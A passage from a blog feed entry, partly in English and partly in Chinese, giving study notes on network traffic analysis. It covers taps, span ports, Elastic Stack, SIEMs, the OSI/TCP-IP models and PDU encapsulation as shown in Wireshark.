Taps</code></td><td>Taps (<a href="https://www.gigamon.com/">Gigamon</a>, <a href="https://www.niagaranetworks.com/products/network-tap">Niagra-taps</a>) are devices capable of taking copies of network traffic and sending them to another place for analysis. These can be in-line or out of band. They can actively capture and analyze the traffic directly or passively by putting the original packet back on the wire as if nothing had changed.</td></tr><tr><td><code>Networking Span Ports</code></td><td><a href="https://en.wikipedia.org/wiki/Port_mirroring">Span Ports</a> are a way to copy frames from layer two or three networking devices during egress or ingress processing and send them to a collection point. Often a port is mirrored to send those copies to a log server.</td></tr><tr><td><code>Elastic Stack</code></td><td>The <a href="https://www.elastic.co/elastic-stack">Elastic Stack</a> is a culmination of tools that can take data from many sources, ingest the data, and visualize it, to enable searching and analysis of it.</td></tr><tr><td><code>SIEMS</code></td><td><code>SIEMS</code> (such as <a href="https://www.splunk.com/en_us">Splunk</a>) are a central point in which data is analyzed and visualized. Alerting, forensic analysis, and day-to-day checks against the traffic are all use cases for a SIEM.</td></tr></tbody></table><h2 id="OSI-x2F-TCP-IP-Models"><a href="#OSI-x2F-TCP-IP-Models" class="headerlink" title="OSI &#x2F; TCP-IP Models"></a>OSI &#x2F; TCP-IP Models</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151216143.png" alt="image"></p><p>在整个模块中，我们将研究许多不同的协议数据单元（PDU），因此需要对其在理论上和线路上的表现进行功能性理解。PDU是由控制信息和从OSI模型的每一层封装的数据组成的数据包。下面的分组显示两个模型中的层如何与PDU匹配。</p><h4 id="PDU-Example"><a href="#PDU-Example" class="headerlink" title="PDU Example"></a>PDU Example</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151220699.png" alt="image"></p><p>在检查PDU时，我们需要牢记封装的概念。当我们的数据在协议栈中向下移动时，每一层都会将前一层的数据封装在一个新的气泡中，我们称之为封装。该气泡将该层的必要信息添加到PDU的报头中。这些信息可能因级别而异，但它包括前一层所持有的内容、操作标志、协商通信所需的任何选项、源和目标IP地址、端口、传输以及应用层协议。</p><h4 id="PDU-Packet-Breakdown"><a href="#PDU-Packet-Breakdown" class="headerlink" title="PDU Packet Breakdown"></a>PDU Packet Breakdown</h4><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151222900.png" alt="image"  /><p>上图显示了一个PDU的组成，与Wireshark的“数据包详细信息”窗格中的数据包分组并排。请注意，当我们在Wireshark中看到突破时，它的顺序是相反的。Wireshark以相反的方式向我们显示PDU，因为它的顺序是未封装的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;网络流量分析（NTA）可以被描述为检查网络流量的行为，以表征所使用的公共端口和协议，为我们的环境建立基线，监控和应对威胁，并确保对我们组织的网络有最大可能的了解。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="tool" scheme="https://taninluv.github.io/tags/tool/"/>
    
  </entry>
  
</feed>
